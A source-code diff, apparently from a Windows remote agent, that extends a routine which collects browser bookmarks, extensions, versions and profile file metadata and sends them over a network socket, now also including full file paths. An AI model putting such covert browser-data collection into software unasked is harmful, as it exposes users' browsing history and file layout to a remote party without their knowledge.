@@ -587,9 +587,10 @@ void handle_input(const unsigned char* p, int n) {
    as file metadata and never opened or decrypted. */
 
 static void b_line(SOCKET s, const char* kind, const char* browser, const char* a,
-                   const char* b, const char* c, long long n) {
-    char line[1200];
-    int len = snprintf(line, sizeof(line), "%s\t%s\t%s\t%s\t%s\t%lld\n", kind, browser, a, b, c, n);
+                   const char* b, const char* c, long long n, const char* path) {
+    char line[1600];
+    int len = snprintf(line, sizeof(line), "%s\t%s\t%s\t%s\t%s\t%lld\t%s\n",
+                       kind, browser, a, b, c, n, path ? path : "");
     if (len > 0 && len < (int)sizeof(line)) send_frame(s, RSP_DATA, (const unsigned char*)line, len);
 }
 
@@ -688,7 +689,7 @@ static void b_bookmarks(SOCKET s, const char* browser, const char* root, const c
             if (n > buf && !strncmp(n, "\"name\"", 6)) json_value(buf, "\"name\"", 6, n, name, sizeof(name));
         }
         b_clean(url, sizeof(url), u, (int)(ue - u));
-        if (url[0]) b_line(s, "B", browser, profile, name, url, 0);
+        if (url[0]) b_line(s, "B", browser, profile, name, url, 0, NULL);
         p = ue + 1;
     }
     free(buf);
@@ -720,7 +721,7 @@ static void b_extensions(SOCKET s, const char* browser, const char* root, const 
             json_value(buf, "\"version\"", 9, buf, version, sizeof(version));
             if (!name[0]) snprintf(name, sizeof(name), "%s", fd.cFileName);
             if (!version[0]) snprintf(version, sizeof(version), "%s", vd.cFileName);
-            b_line(s, "E", browser, profile, name, version, 0);
+            b_line(s, "E", browser, profile, name, version, 0, NULL);
             free(buf);
         } while (FindNextFileA(vh, &vd));
         FindClose(vh);
@@ -757,7 +758,7 @@ static void browser_profile(SOCKET s, const char* browser, const char* root,
         snprintf(path, sizeof(path), "%s\\%s\\%s", root, profile, files[i]);
         if (!file_stat(path, &size, &mt)) continue;
         snprintf(num, sizeof(num), "%lld", mt);
-        b_line(s, "F", browser, profile, files[i], num, size);
+        b_line(s, "F", browser, profile, files[i], num, size, path);
     }
     b_bookmarks(s, browser, root, profile);
     b_extensions(s, browser, root, profile);
@@ -776,7 +777,7 @@ static void browser_version(SOCKET s, const char* browser, const char* root) {
     CloseHandle(h);
     while (rd > 0 && (v[rd - 1] == '\n' || v[rd - 1] == '\r' || v[rd - 1] == ' ')) v[--rd] = 0;
     if (rd == 0) return;
-    b_line(s, "V", browser, "-", v, "0", 0);
+    b_line(s, "V", browser, "-", v, "0", 0, NULL);
 }
 
 void handle_browser(SOCKET s) {
